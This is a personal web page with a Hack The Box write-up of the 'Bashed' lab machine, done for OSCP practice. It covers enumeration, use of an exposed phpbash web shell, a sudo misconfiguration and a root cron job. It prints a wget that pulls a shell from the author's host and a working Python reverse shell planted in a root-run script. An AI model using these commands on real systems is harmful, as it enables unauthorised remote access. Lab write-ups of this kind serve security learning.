<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Bashed - Hack The Box Write-Up</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@300;400;500;600&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="../css/style.css">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
</head>
<body>
  <div class="container">
    <nav class="navbar">
      <ul class="nav-links">
        <li><a href="../index.html"><i class="fas fa-home"></i> Home</a></li>
        <li><a href="../index.html#about"><i class="fas fa-user"></i> About</a></li>
        <li><a href="../projects.html"><i class="fas fa-code"></i> Projects</a></li>
        <li><a href="../writeups.html"><i class="fas fa-file-alt"></i> Write-Ups</a></li>
        <li><a href="../index.html#contact"><i class="fas fa-envelope"></i> Contact</a></li>
      </ul>
    </nav>

    <div class="contents">
      <h1>Bashed – HackTheBox WriteUp</h1>

      <div class="big-to-normal-image">
        <img src="../images/bashed_banner.webp" alt="Bashed Banner">
      </div>

      <p>This write-up focuses on the Hack The Box machine “Bashed,” which is part of TJnull’s recommended list for OSCP preparation. Bashed centers on web application vulnerabilities, especially the exploitation of file upload flaws and the use of Bash scripting for privilege escalation.</p>

      <h2>Enumeration</h2>
      <h3>Nmap Scan</h3>
      <p>I started by performing an Nmap scan to gather information about the target host. After reviewing the scan results, I noticed that the only port open and available for further exploration was port 80. This indicated that the host might be running a web service, which would likely be my primary point of entry for further investigation.</p>

      <div class="snippet">
        <pre class="code-block">nmap -A -v 10.129.230.104

Starting Nmap 7.94 ( https://nmap.org ) at 2024-10-31 12:55 CDT
...
Nmap scan report for 10.129.230.104
Host is up (0.20s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Arrexel's Development Site
...
Nmap done: 1 IP address (1 host up) scanned in 40.12 seconds</pre>
      </div>

      <h2>Port 80</h2>
      <p>Upon visiting the website, one detail immediately stood out — a blog post discussing phpbash, a tool known for its utility in penetration testing. This caught my attention as it hinted at potential functionality or vulnerabilities I could leverage. Given this lead, I decided to run a directory brute-forcing scan using ffuf to discover any additional accessible directories or hidden files that might be useful.</p>

      <div class="big-to-normal-image">
        <img src="../images/bashed1.webp" alt="Port 80 webpage with phpbash mention">
      </div>

      <h2>/Dev Directory</h2>
      <p>The ffuf scan quickly returned some intriguing results, with several directories standing out. Among them, the /dev directory seemed particularly promising, so I navigated there to see what it contained. Inside, I discovered two specific files: phpbash.php and phpbash.min.php. Both of these files caught my attention, as they suggested that a web shell might be accessible.</p>

      <div class="snippet">
        <pre class="code-block">ffuf -u http://10.129.230.104/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt

...
[Status: 301] dev
[Status: 301] uploads
[Status: 301] css
[Status: 301] js
[Status: 301] fonts
[Status: 301] images
[Status: 301] php
...</pre>
      </div>

      <div class="big-to-normal-image">
        <img src="../images/bashed2.webp" alt="/dev directory contents">
      </div>

      <h2>Webshell</h2>
      <p>Upon accessing phpbash.php, I was immediately presented with an interactive web shell running with www-data privileges. This was significant, as it provided a direct line to execute commands on the server, albeit with limited permissions. With this shell, I could start navigating the file system, inspecting critical files, and gathering more information about the environment and its configuration.</p>

      <div class="big-to-normal-image">
        <img src="../images/bashed3.webp" alt="phpbash web shell">
      </div>

      <h2>User Flag</h2>
      <p>Next, I began exploring the system to understand my access level and permissions. Inside the home directory, I found two directories named arrexel and scriptmanager. Noticing I had read permissions for both, I examined their contents and successfully retrieved the user flag from the arrexel directory.</p>

      <div class="snippet">
        <pre class="code-block">www-data@bashed:/# cd /home
www-data@bashed:/home# ls
arrexel  scriptmanager
www-data@bashed:/home# cd arrexel
www-data@bashed:/home/arrexel# ls
user.txt
www-data@bashed:/home/arrexel# cat user.txt
03c8b814faac16b272aff649793a9640</pre>
      </div>

      <h2>LinEnum.sh</h2>
      <p>After obtaining the user flag, I uploaded LinEnum.sh from my local machine to conduct deeper enumeration. Once the script finished running, it revealed a key privilege escalation opportunity: the www-data user could execute commands as the scriptmanager user without a password.</p>

      <div class="snippet">
        <pre class="code-block">User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL</pre>
      </div>

      <h2>Shell Upgrade</h2>
      <p>Before proceeding with privilege escalation, I needed a more stable shell for reliable interaction. To achieve this, I uploaded a shell script to the target that allowed me to establish a direct connection through my local terminal, providing a more stable and responsive environment for executing further commands and tests.</p>

      <div class="snippet">
        <pre class="code-block">www-data@bashed:/var/www/html/dev# cd ..

www-data@bashed:/var/www/html# cd uploads

www-data@bashed:/var/www/html/uploads# wget 10.10.16.27/shell.php

--2024-10-31 11:27:02-- http://10.10.16.27/shell.php
Connecting to 10.10.16.27:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5493 (5.4K) [application/octet-stream]
Saving to: 'shell.php'

0K ..... 100% 30.5K=0.2s

2024-10-31 11:27:03 (30.5 KB/s) - 'shell.php' saved [5493/5493]</pre>
      </div>

      <div class="big-to-normal-image">
        <img src="../images/bashed4.webp" alt="Shell upgrade and reverse connection">
      </div>

      <p>Once I successfully connected through my local terminal, I utilized a Python script to upgrade my shell to a fully interactive one. This enhancement was crucial, as it allowed for more complex command execution and better control over the environment.</p>

      <div class="snippet">
        <pre class="code-block">python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
stty rows 52 columns 236</pre>
      </div>

      <h2>Pspy64</h2>
      <p>With my shell upgraded, I shifted my focus to escalating my privileges. To aid in this process, I uploaded a tool called pspy64, which allowed me to monitor the running processes on the system. After executing the tool, I discovered that a file named test.py was being run by the root user every few minutes. This presented a potential opportunity for privilege escalation.</p>

      <div class="snippet">
        <pre class="code-block">./pspy64
...
2024/10/31 11:50:01 CMD: UID=0     PID=1883   | python test.py</pre>
      </div>

      <h2>Sudo</h2>
      <p>Next, I utilized the sudo permissions available to the scriptmanager user to edit the test.py file. I removed the original script that it was executing and replaced it with a Python reverse shell script, then saved the changes. This modification would allow me to gain remote access with elevated privileges when the script was executed by the root user.</p>

      <div class="snippet">
        <pre class="code-block">www-data@bashed:/home/scriptmanager$ sudo -u scriptmanager nano /scripts/test.py</pre>
      </div>

      <div class="snippet">
        <pre class="code-block">import socket, subprocess, os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.10.16.27", 8081))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])</pre>
      </div>

      <h2>Root</h2>
      <p>After waiting for about a minute, I successfully established a reverse shell connection as the root user. Once connected, I navigated to the root directory and retrieved the root flag, successfully pwning the machine!</p>

      <div class="snippet">
        <pre class="code-block"># whoami
root
# cd /root
# cat root.txt
baf3c31fab2cafc5902c3215bf94dc16</pre>
      </div>

      <div class="big-to-normal-image">
        <img src="../images/bashed5.webp" alt="Root shell and flag">
      </div>
    </div>
  </div>
</body>
</html>
